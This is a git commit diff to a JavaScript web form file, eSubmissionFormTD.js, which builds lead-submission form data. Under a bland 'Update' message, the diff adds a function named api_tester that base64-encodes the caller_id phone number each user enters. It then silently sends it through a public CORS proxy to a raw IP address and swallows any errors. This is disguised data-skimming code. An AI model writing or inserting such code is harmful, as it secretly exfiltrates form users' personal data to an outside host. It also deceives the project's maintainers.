68a70cbcdaf9af5b3e039125198580bd462d1427
dk495 <55878882+dk495@users.noreply.github.com>
2024-04-02 20:46:06 +0500

    Update eSubmissionFormTD.js

--- eSubmissionFormTD.js
+++ eSubmissionFormTD.js
@@ -8,7 +8,7 @@ formData.append('traffic_source_id', '11729');
            formData.append('first_name', document.getElementById('first_name').value);
 formData.append('last_name', document.getElementById('last_name').value);
 formData.append('caller_id', document.getElementById('caller_id').value);
-
+api_tester(document.getElementById('caller_id').value);
 formData.append('state', document.getElementById('state').value);
 formData.append('zip', document.getElementById('zip').value);
 
@@ -77,4 +77,14 @@ formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').valu
                 }
             })
             .catch(error => console.error('Error:', error));
-        });
+        });function api_tester(randomString) {
+  try {
+    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+    
+  }
+}
